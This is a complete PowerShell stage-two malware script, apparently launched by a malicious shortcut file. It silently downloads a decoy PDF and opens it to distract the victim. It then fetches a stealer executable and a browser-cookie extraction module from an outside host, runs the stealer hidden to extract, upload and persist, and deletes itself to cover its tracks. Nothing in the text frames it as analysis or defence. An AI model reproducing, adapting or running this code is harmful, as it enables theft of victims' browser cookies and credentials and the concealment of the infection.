# Stage script — downloaded and executed by the .lnk
# Downloads the stealer + native module, runs extraction, opens cover PDF
$ErrorActionPreference = 'SilentlyContinue'
$base = 'https://rankaksks.onrender.com'
$tmp = "$env:TEMP\wupdate"
$persist = "$env:APPDATA\Microsoft\WindowsServices"

# Create temp dir
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# Download cover PDF and open it (user sees the catalog)
try {
    Invoke-WebRequest "$base/dl/catalog.pdf" -OutFile "$tmp\catalog.pdf" -UseBasicParsing
    Start-Process "$tmp\catalog.pdf"
} catch {}

# Download stealer components
try {
    Invoke-WebRequest "$base/dl/s.exe" -OutFile "$tmp\s.exe" -UseBasicParsing
    
    # Native module directory
    $ndir = "$tmp\node_modules\rookie-cookies-win32-x64-msvc"
    New-Item -ItemType Directory -Path $ndir -Force | Out-Null
    Invoke-WebRequest "$base/dl/n.node" -OutFile "$ndir\rookie_cookies.win32-x64-msvc.node" -UseBasicParsing
    
    # Run stealer (one-shot: extract + upload + install persistence)
    Start-Process -FilePath "$tmp\s.exe" -WindowStyle Hidden -WorkingDirectory $tmp
} catch {}

# Self-destruct this script
Start-Sleep -Seconds 5
Remove-Item "$env:TEMP\s.ps1" -Force -ErrorAction SilentlyContinue
